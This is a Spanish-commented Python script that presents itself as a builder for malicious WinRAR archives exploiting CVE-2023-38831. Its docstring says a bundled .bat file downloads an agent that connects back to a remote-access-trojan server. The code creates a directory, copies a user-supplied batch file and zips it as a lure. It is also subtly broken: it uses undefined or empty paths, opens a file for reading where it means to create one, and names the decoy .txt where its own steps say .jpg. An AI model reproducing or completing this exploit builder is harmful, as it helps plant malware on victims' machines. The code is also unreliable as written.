'''
Generador de archivos winrar malicioso basados en la vulnerabilidad CVE-2023-38831

Referencia:
https://nvd.nist.gov/vuln/detail/CVE-2023-38831

Inspiración:
https://github.com/b1tg/CVE-2023-38831-winrar-exploit

autor: Anthony aka d34dyP00l

Pasos:
crear un directorio DIRECTORIO1 y dentro de este un archivo con el mismo nombre DIRECTORIO1.jpg, 
además de un .bat, el cual descargará el agente para recibir conexión al Servidor del RAT (RATATOUILLE)

'''

import os 
import shutil
from zipfile import ZipFile
class MalWinrar:
    USUARIO=os.getlogin()
    rutaPadre=f"/home/{USUARIO}/"
    directorio=""
    malBatNombre=""
    malDirectorio=""
    def establecerDatos(self):
        self.malDirectorio = input("Introduce el nombre del directorio a crear->")
        self.malBatNombre = input("Introduce el nombre del archivo .bat  a subir->")

    def crearDirectorio(self):
        directorio = self.malDirectorio
        path = os.path.join(self.rutaPadre,directorio)
        os.mkdir(path)
        if os.path.exists(path):
            print(f"El directorio {path} existe.")
            self.directorioP=path
        else:
            
            archivo=path+"/"+self.malDirectorio+".txt"
            with open(f"{archivo}") as archO:
                pass
        if os.path.exists(archivo):
            print("archivo creado de forma satisfactoria.")
            
        else:
            print("No se pudo crear el archivo.")
        
        

    def agregarBatch(self):
        src=  self.malBatNombre
        dst= self.directorio
        malBatAddr=dst+"/"+src
        shutil.copyfile(src,dst)
        if os.path.exists(malBatAddr):
            print("El archivo .bat fue copiado exitosamente.")
    
    def comprimir(self):
        malZipPath= self.directorio + "/"+self.malDirectorio+".zip"
        archivomal=self.malDirectorio+".txt"
        with ZipFile(malZipPath,'w') as malzip:
            malzip.write(self.malBatNombre)
            malzip.write(archivomal)

    def correrAtaque(self):
        self.establecerDatos()
        self.crearDirectorio()
        self.agregarBatch()
        self.comprimir()
    





        




